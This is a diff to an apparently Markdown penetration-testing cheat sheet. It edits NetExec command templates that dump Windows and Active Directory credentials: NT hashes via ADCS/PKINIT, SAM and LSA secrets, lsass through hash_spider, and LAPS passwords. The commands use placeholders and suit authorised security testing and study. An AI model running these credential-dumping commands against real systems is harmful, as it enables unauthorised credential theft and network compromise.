@@ -457,21 +457,21 @@ grep -i <keyword> *
   ### Dump NT:hash with masky with domain user
   #### Get ADCS server name
   ```bash
-  sudo NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> -M adcs
+  NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> -M adcs
   ```
   #### Retrieve the NT hash using PKINIT
   ```bash
-  sudo NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M masky -o CA=<'ADCS_server_name'>
+  NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M masky -o CA=<'ADCS_server_name'>
   ```
   
   ### Dump SAM with domain user
   ```bash
-  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> --sam
+  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> --sam
   ```
   
    ### Dump LSA with domain user
   ```bash
-  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --lsa
+  NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --lsa
   ```
 </details> 
 
@@ -480,17 +480,17 @@ grep -i <keyword> *
   
   ### Dump SAM on local computer
   ```bash
-  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --sam
+  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --sam
   ```
   
   ### Dump LSA on local computer
   ```bash
-  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --lsa
+  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --lsa
   ```
 
   ### Dump lsass with hash_spider to recursively using BloodHound to find local admins path (adminTo)
   ```bash
-  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth -M hash_spider
+  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth -M hash_spider
   ```
   
 </details> 
@@ -500,17 +500,17 @@ grep -i <keyword> *
 
   ### Check if the user can read LAPS
   ```bash
-  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M laps
+  NetExec ldap <AD_domain> -u <username> -p <password> -H <hash[LM:NT]> -M laps
   ```
   
   ### Dump SAM 
   ```bash
-  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M laps --sam
+  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M laps --sam
   ```
   
   ### Dump LSA 
   ```bash
-  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --M laps --lsa
+  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --M laps --lsa
   ```
   
 </details> 
